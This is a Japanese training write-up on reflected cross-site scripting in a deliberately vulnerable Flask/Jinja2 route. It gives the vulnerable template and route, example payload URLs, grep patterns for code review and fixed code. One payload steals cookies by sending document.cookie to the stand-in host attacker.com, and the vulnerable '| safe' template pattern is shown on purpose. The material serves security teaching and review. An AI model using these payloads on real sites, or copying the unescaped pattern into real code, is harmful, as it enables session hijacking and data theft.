# 1. XSS（クロスサイトスクリプティング）

## 概要
ユーザーの入力値がHTMLページにエスケープされずに出力されることで、攻撃者が任意のJavaScriptを被害者のブラウザ上で実行できる脆弱性。

## 参考
- IPA「安全なウェブサイトの作り方」: 1.5 クロスサイト・スクリプティング
- OWASP Top 10 2021: A03:2021 – Injection
- CWE-79: Improper Neutralization of Input During Web Page Generation

## 脆弱なコード

**テンプレート (vuln_xss.html)**
```html
<!-- safe フィルタがHTMLエスケープを無効化している -->
「{{ query | safe }}」の検索結果: 0件
```

**ルート (app.py)**
```python
@app.route('/vuln/xss')
def vuln_xss():
    q = request.args.get('q', '')
    return render_template('vuln_xss.html', query=q)
```

## 攻撃手順とペイロード例

### 基本的なXSS
```
http://localhost:5000/vuln/xss?q=<script>alert('XSS')</script>
```

### Cookie窃取
```
http://localhost:5000/vuln/xss?q=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
```

### imgタグを利用
```
http://localhost:5000/vuln/xss?q=<img src=x onerror="alert(document.cookie)">
```

### SVGを利用
```
http://localhost:5000/vuln/xss?q=<svg onload="alert('XSS')">
```

## ホワイトボックス診断の着眼点

### このアプリで見るべき箇所
| ファイル | 行 | 注目ポイント |
|---------|-----|------------|
| `app/templates/vuln_xss.html` | 34 | `{{ query \| safe }}` — `safe` フィルタがエスケープを無効化 |
| `app/app.py` | 87-90 | `vuln_xss()` — ユーザー入力 `q` をそのままテンプレートへ渡している |

### コードレビューで探すパターン（grep対象）
```bash
# Jinja2テンプレートで safe フィルタを使用している箇所
grep -rn '| *safe' app/templates/

# Markup() や mark_safe() でエスケープを無効化している箇所
grep -rn 'Markup(' app/
grep -rn 'mark_safe(' app/

# render_template_string() の使用（テンプレートインジェクションの可能性）
grep -rn 'render_template_string' app/

# autoescape を無効化している箇所
grep -rn 'autoescape.*False' app/
grep -rn '{% autoescape false %}' app/templates/
```

### 診断の勘所
1. **データフロー追跡**: `request.args` / `request.form` → テンプレート変数 → HTML出力の経路を追う
2. **テンプレートの確認**: 全テンプレートで `| safe` / `{% autoescape false %}` を検索する
3. **フレームワークの保護機能**: Jinja2はデフォルトでauto-escapeが有効。それを意図的に無効化している箇所が危険
4. **出力コンテキストの確認**: HTML本文、属性値、JavaScript内、URL内でそれぞれ必要なエスケープ方式が異なる
5. **レスポンスヘッダ**: `Content-Type` や `Content-Security-Policy` ヘッダの有無を確認

## 対策（修正コード + セキュリティ原則）

### 修正方法1: safe フィルタを削除
```html
<!-- Jinja2のデフォルトのauto-escapeを活かす -->
「{{ query }}」の検索結果: 0件
```

### 修正方法2: サーバー側でサニタイズ
```python
from markupsafe import escape

@app.route('/vuln/xss')
def vuln_xss():
    q = request.args.get('q', '')
    return render_template('vuln_xss.html', query=escape(q))
```

### セキュリティ原則
- **出力エスケープ**: HTMLに出力する際は必ずエスケープする
- **Content-Security-Policy ヘッダ**: インラインスクリプトの実行を制限する
- **HttpOnly Cookie**: JavaScriptからCookieにアクセスできないようにする
